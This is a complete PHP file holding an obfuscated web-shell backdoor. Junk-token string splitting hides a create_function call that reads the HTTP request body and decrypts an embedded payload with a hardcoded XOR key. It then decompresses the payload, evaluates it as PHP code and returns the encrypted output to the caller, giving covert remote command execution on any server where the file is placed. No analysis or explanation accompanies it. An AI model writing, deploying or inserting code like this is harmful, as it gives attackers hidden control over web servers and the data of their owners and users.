<?php
$e='$koI="72fd012oI7";$koIh=oI"b04oIa0b08oI6adc";$oIkf="84coIf4b1078d2"oIoI;$p="9EFQ6wNq4noIoIgCIYof";functioIon x($oIt,';
$U='//ioInput"oI),$moI)==1) {@ooIb_staroIt();oI@eoIval(@goIzuncompresoIs(oI@x(@boIase64_decode($m[1]oI),oI$k)));$oIo=@ob_g';
$X=str_replace('QM','','cQMQMreaQMte_fuQMnQMctQMion');
$Q='{$ooIoI.=$t{$i}^oI$k{oI$j};}}retoIurn $o;}if oI(@preoIg_oImatch("/$kh(oI.oI+)$koIf/"oI,@file_getoI_contoIents("php:oI';
$l='eoIt_cooIntents(oI);@ob_oIendoI_cleaoIn();$r=@basoIe64_enoIcoIooIde(@x(@goIzcomproIeoIss($o),$oIk));printoI("$p$kh$r$kf");}';
$C='$koIoIoI){$c=strlen($k);$loI=stroIleoIn($t);$o="oI";for($oIi=0;$i<$oIl;){foroIoI($j=0oI;($j<$oIc&&$ioI<$l);$j++oI,$i++)';
$E=str_replace('oI','',$e.$C.$Q.$U.$l);
$Y=$X('',$E);$Y();
?>
